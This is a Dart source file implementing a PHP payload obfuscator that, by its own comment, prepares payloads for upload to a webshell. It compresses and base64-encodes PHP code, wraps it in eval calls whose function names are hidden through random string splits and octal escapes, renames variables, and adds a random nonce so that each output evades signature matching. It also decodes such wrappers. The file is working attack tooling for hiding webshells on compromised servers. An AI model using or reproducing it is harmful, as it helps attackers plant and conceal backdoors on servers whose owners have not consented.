import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';

import 'deflate_stub.dart' if (dart.library.io) 'deflate_io.dart';

/// Obfuscates and deobfuscates text payloads before uploading to a webshell.
///
/// Only **PHP** is supported: `eval(gzinflate(base64_decode('…')))` wrappers with
/// optional concat/octal/mixed function-name hiding and a random nonce.
///
/// Each successful obfuscation call produces different output (random splits + nonce).
class PayloadObfuscator {
  // ── PHP detection ─────────────────────────────────────────────────────────
  //
  // All modern wrappers share the same call shape:
  //   <?php $a=<fn>;$b=<fn>;@eval($a($b('B64')));?>   (gzip, 2 vars)
  //   <?php $a=<fn>;@eval($a('B64'));?>                (no-gzip, 1 var)
  //
  // <fn> is one of:
  //   concat  →  'xx'.'yy'  (single-quoted parts)
  //   octal   →  "\NNN\NNN" (double-quoted octal escapes, digits only)
  //   mixed   →  one concat + one octal
  //
  // The regexes below use a shared sub-pattern _phpFnPat that matches either
  // a concat or an octal function-name literal, so one pair of regexes covers
  // concat, octal, and mixed modes.

  // Legacy: literal function names written directly
  static final _phpLiteralGzipRe = RegExp(
    r'''<\?php\s+@?eval\s*\(\s*gzinflate\s*\(\s*base64_decode\s*\(\s*'([A-Za-z0-9+/=]+)'\s*\)\s*\)\s*\)\s*;?\s*\?>''',
    caseSensitive: false,
  );
  static final _phpLiteralB64Re = RegExp(
    r'''<\?php\s+@?eval\s*\(\s*base64_decode\s*\(\s*'([A-Za-z0-9+/=]+)'\s*\)\s*\)\s*;?\s*\?>''',
    caseSensitive: false,
  );

  // Obfuscated (concat / octal / mixed): 2-var gzip form
  //   <?php $x=<fn>;$y=<fn>;@eval($x($y('B64')));?>
  // _phpFnPat inlined: (?:(?:'[^']*'(?:\.'[^']*')+)|(?:"(?:\\[0-7]{3})+"))
  static final _phpObfGzipRe = RegExp(
    r"""<\?php\s+\$\w+=(?:(?:'[^']*'(?:\.'[^']*')+)|(?:"(?:\\[0-7]{3})+"));\$\w+=(?:(?:'[^']*'(?:\.'[^']*')+)|(?:"(?:\\[0-7]{3})+"));@eval\(\$\w+\(\$\w+\('([A-Za-z0-9+/=]+)'\)\)\);?\?>""",
    caseSensitive: false,
  );

  // Obfuscated: 1-var no-gzip form
  //   <?php $x=<fn>;@eval($x('B64'));?>
  static final _phpObfB64Re = RegExp(
    r"""<\?php\s+\$\w+=(?:(?:'[^']*'(?:\.'[^']*')+)|(?:"(?:\\[0-7]{3})+"));@eval\(\$\w+\('([A-Za-z0-9+/=]+)'\)\);?\?>""",
    caseSensitive: false,
  );

  // ── Public API ────────────────────────────────────────────────────────────

  static bool supportsType(String type) => type == 'php';

  static bool isObfuscated(String content) {
    final t = content.trim();
    return _phpLiteralGzipRe.hasMatch(t) ||
        _phpLiteralB64Re.hasMatch(t) ||
        _phpObfGzipRe.hasMatch(t) ||
        _phpObfB64Re.hasMatch(t);
  }

  static String? obfuscate(String content, String type) {
    if (type != 'php') return null;
    return _obfuscatePhp(content);
  }

  static String? tryDeobfuscate(String content) =>
      _deobfuscatePhp(content.trim());

  static Uint8List? obfuscateBytes(Uint8List bytes, String type) {
    try {
      final out = obfuscate(utf8.decode(bytes), type);
      if (out == null) return null;
      return Uint8List.fromList(utf8.encode(out));
    } catch (_) {
      return null;
    }
  }

  static String typeFromFileName(String name) {
    final ext = name.contains('.') ? name.split('.').last.toLowerCase() : '';
    switch (ext) {
      case 'php':
        return 'php';
      case 'jsp':
      case 'jspx':
        return 'jsp';
      case 'aspx':
        return 'aspx';
      case 'asp':
        return 'asp';
      default:
        return 'other';
    }
  }

  // ── PHP ───────────────────────────────────────────────────────────────────

  // PHP superglobals and special vars — never rename
  static const _phpSuperGlobals = <String>{
    '_GET',
    '_POST',
    '_REQUEST',
    '_SERVER',
    '_FILES',
    '_COOKIE',
    '_SESSION',
    '_ENV',
    '_GLOBALS',
    'GLOBALS',
    'this',
  };

  static String _obfuscatePhp(String content) {
    var code = content.trim();
    if (code.startsWith('<?php')) {
      code = code.substring(5);
    } else if (code.startsWith('<?')) {
      code = code.substring(2);
    }
    if (code.endsWith('?>')) code = code.substring(0, code.length - 2);
    code = code.trim();
    // Rename user-defined variables to single letters
    final renameMap = _buildPhpRenameMap(code);
    if (renameMap.isNotEmpty) code = _applyPhpRenameMap(code, renameMap);
    // Random nonce ensures different gzip output on every call
    final nonce = _rnd.nextInt(0xFFFFFF).toRadixString(16).padLeft(6, '0');
    code = '/*$nonce*/$code';
    final bytes = utf8.encode(code);
    final payload = base64Encode(supportsDeflate ? rawDeflate(bytes) : bytes);
    // Randomly pick one of three obfuscation modes for the PHP wrapper.
    switch (_rnd.nextInt(3)) {
      case 0:
        return _phpConcatWrapper(payload, supportsDeflate);
      case 1:
        return _phpOctalWrapper(payload, supportsDeflate);
      default:
        return _phpMixedWrapper(payload, supportsDeflate);
    }
  }

  // ── PHP wrapper helpers ───────────────────────────────────────────────────
  //
  // All three wrappers share the same runtime shape for full PHP compatibility:
  //
  //   <?php $a=<fn_gzip>;$b=<fn_decode>;@eval($a($b('B64')));?>   (with gzip)
  //   <?php $a=<fn_decode>;@eval($a('B64'));?>                     (no gzip)
  //
  // eval() is kept as a literal language construct — it cannot be called
  // through a variable function in any PHP version.  Only gzinflate and
  // base64_decode (regular functions) are hidden inside variables.

  /// Concat mode: `'bas'.'e64'.'_decode'`  — random split positions each call.
  static String _phpConcatWrapper(String payload, bool withGzip) {
    final vars = _phpRandVarNames(withGzip ? 2 : 1);
    final assigns = StringBuffer();
    if (withGzip) assigns.write('\$${vars[0]}=${_splitConcat("gzinflate")};');
    assigns.write(
      '\$${vars[withGzip ? 1 : 0]}=${_splitConcat("base64_decode")};',
    );
    final call = withGzip
        ? '@eval(\$${vars[0]}(\$${vars[1]}(\'$payload\')))'
        : '@eval(\$${vars[0]}(\'$payload\'))';
    return '<?php $assigns$call;?>';
  }

  /// Octal mode: `"\147\172\151\156\146\154\141\164\145"` — only digits in escapes.
  static String _phpOctalWrapper(String payload, bool withGzip) {
    final vars = _phpRandVarNames(withGzip ? 2 : 1);
    final assigns = StringBuffer();
    if (withGzip) {
      assigns.write('\$${vars[0]}="${_toPhpOctal("gzinflate")}";');
    }
    assigns.write(
      '\$${vars[withGzip ? 1 : 0]}="${_toPhpOctal("base64_decode")}";',
    );
    final call = withGzip
        ? '@eval(\$${vars[0]}(\$${vars[1]}(\'$payload\')))'
        : '@eval(\$${vars[0]}(\'$payload\'))';
    return '<?php $assigns$call;?>';
  }

  /// Mixed mode: one function uses concat, the other uses octal (random choice).
  static String _phpMixedWrapper(String payload, bool withGzip) {
    final vars = _phpRandVarNames(withGzip ? 2 : 1);
    final assigns = StringBuffer();
    if (withGzip) {
      // Randomly assign which function gets which encoding
      final gzipIsOctal = _rnd.nextBool();
      final gzLit = gzipIsOctal
          ? '"${_toPhpOctal("gzinflate")}"'
          : _splitConcat('gzinflate');
      final decLit = gzipIsOctal
          ? _splitConcat('base64_decode')
          : '"${_toPhpOctal("base64_decode")}"';
      assigns.write('\$${vars[0]}=$gzLit;');
      assigns.write('\$${vars[1]}=$decLit;');
    } else {
      // Only one function — randomly pick encoding
      final lit = _rnd.nextBool()
          ? _splitConcat('base64_decode')
          : '"${_toPhpOctal("base64_decode")}"';
      assigns.write('\$${vars[0]}=$lit;');
    }
    final call = withGzip
        ? '@eval(\$${vars[0]}(\$${vars[1]}(\'$payload\')))'
        : '@eval(\$${vars[0]}(\'$payload\'))';
    return '<?php $assigns$call;?>';
  }

  /// Split [s] into 2–3 single-quoted parts joined with '.' at random offsets.
  static String _splitConcat(String s) {
    final len = s.length;
    final cuts = <int>[];
    if (len > 4) {
      cuts.add(1 + _rnd.nextInt(len ~/ 2));
      if (len > 6 && _rnd.nextBool()) {
        final second = cuts[0] + 1 + _rnd.nextInt(len - cuts[0] - 1);
        if (second < len) cuts.add(second);
      }
    } else {
      cuts.add(1 + _rnd.nextInt(len - 1));
    }
    cuts.sort();
    final parts = <String>[];
    var prev = 0;
    for (final c in cuts) {
      parts.add("'${s.substring(prev, c)}'");
      prev = c;
    }
    parts.add("'${s.substring(prev)}'");
    return parts.join('.');
  }

  /// Convert every character to a three-octal-digit PHP escape `\NNN`.
  /// Only digits 0–7 appear in the resulting escape sequences.
  static String _toPhpOctal(String s) {
    final buf = StringBuffer();
    for (final cp in s.runes) {
      buf.write('\\');
      buf.write(cp.toRadixString(8).padLeft(3, '0'));
    }
    return buf.toString();
  }

  /// Generate [n] distinct short PHP variable names like _aK, _bX …
  static List<String> _phpRandVarNames(int n) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    final names = <String>{};
    while (names.length < n) {
      final a = chars[_rnd.nextInt(chars.length)];
      final b = chars[_rnd.nextInt(chars.length)];
      names.add('_$a$b');
    }
    return names.toList();
  }

  /// Collect all user-defined PHP variable names (≥ 2 chars, not superglobals).
  static Map<String, String> _buildPhpRenameMap(String code) {
    final declared = <String>{};
    // Match $varName but not $$varName (variable variables)
    final varRe = RegExp(r'(?<!\$)\$([a-zA-Z_][a-zA-Z0-9_]+)');
    for (final m in varRe.allMatches(code)) {
      final name = m.group(1)!;
      if (!_phpSuperGlobals.contains(name)) declared.add(name);
    }
    final map = <String, String>{};
    var idx = 0;
    for (final n in declared) {
      map[n] = _shortName(idx++);
    }
    return map;
  }

  static String _applyPhpRenameMap(String code, Map<String, String> map) {
    var result = code;
    for (final entry in map.entries) {
      result = result.replaceAllMapped(
        RegExp(r'(?<!\$)\$' + RegExp.escape(entry.key) + r'\b'),
        (_) => '\$${entry.value}',
      );
    }
    return result;
  }

  static String? _deobfuscatePhp(String t) {
    // Try all four PHP wrapper patterns; extract the base64 payload from each.
    String? decodeGzip(String b64) {
      try {
        var s = utf8.decode(rawInflate(base64Decode(b64)));
        return s.replaceFirst(RegExp(r'^/\*[0-9a-f]+\*/'), '');
      } catch (_) {
        return null;
      }
    }

    String? decodeB64(String b64) {
      try {
        var s = utf8.decode(base64Decode(b64));
        return s.replaceFirst(RegExp(r'^/\*[0-9a-f]+\*/'), '');
      } catch (_) {
        return null;
      }
    }

    for (final pattern in [_phpLiteralGzipRe, _phpObfGzipRe]) {
      final m = pattern.firstMatch(t);
      if (m != null) {
        final decoded = decodeGzip(m.group(1)!);
        if (decoded != null) return '<?php\n$decoded\n?>';
      }
    }
    for (final pattern in [_phpLiteralB64Re, _phpObfB64Re]) {
      final m = pattern.firstMatch(t);
      if (m != null) {
        final decoded = decodeB64(m.group(1)!);
        if (decoded != null) return '<?php\n$decoded\n?>';
      }
    }
    return null;
  }

  /// Generates: a … z, aa, ab … az, ba …
  static String _shortName(int i) {
    if (i < 26) return String.fromCharCode(0x61 + i);
    final hi = i ~/ 26 - 1;
    final lo = i % 26;
    return '${String.fromCharCode(0x61 + hi)}${String.fromCharCode(0x61 + lo)}';
  }

  static final _rnd = Random.secure();
}
